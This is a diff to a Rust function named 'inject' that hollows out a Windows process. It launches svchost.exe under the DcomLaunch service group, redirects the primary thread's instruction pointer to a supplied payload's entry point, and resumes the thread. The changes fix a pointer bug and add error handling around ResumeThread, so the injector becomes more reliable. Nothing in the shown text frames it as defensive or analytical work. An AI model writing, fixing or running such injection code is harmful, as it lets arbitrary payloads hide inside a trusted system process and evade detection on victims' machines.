@@ -41,14 +41,14 @@ pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
     si.cb = size_of::<STARTUPINFOW>() as u32;
     let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
 
-    let path_wide: Vec<u16> = "C:\\Windows\\System32\\svchost.exe -k DcomLaunch\0"
+    let mut path_wide: Vec<u16> = "C:\\Windows\\System32\\svchost.exe -k DcomLaunch\0"
         .encode_utf16()
         .collect();
 
     let ok = unsafe {
         CreateProcessW(
             null(),
-            path_wide.as_ptr() as *mut u16,
+            path_wide.as_mut_ptr(),
             null(),
             null(),
             FALSE,
@@ -166,6 +166,8 @@ pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
     }
 
     ctx.Rip = oep as u64;
+    // Rcx is the thread start parameter; zero is safe for an EXE-style PE entry point
+    // (receives NULL as parameter, which is standard for process entry).
     ctx.Rcx = 0;
 
     let ok = unsafe { SetThreadContext(pi.hThread, &ctx) };
@@ -176,8 +178,16 @@ pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
     }
 
     // Step 8: resume the primary thread and close handles.
+    let prev_count = unsafe { ResumeThread(pi.hThread) };
+    if prev_count == u32::MAX {
+        // Resume failed — still close handles, return error.
+        unsafe {
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+        }
+        return Err(InjectionError::ThreadFailed("ResumeThread failed".into()));
+    }
     unsafe {
-        ResumeThread(pi.hThread);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
     }
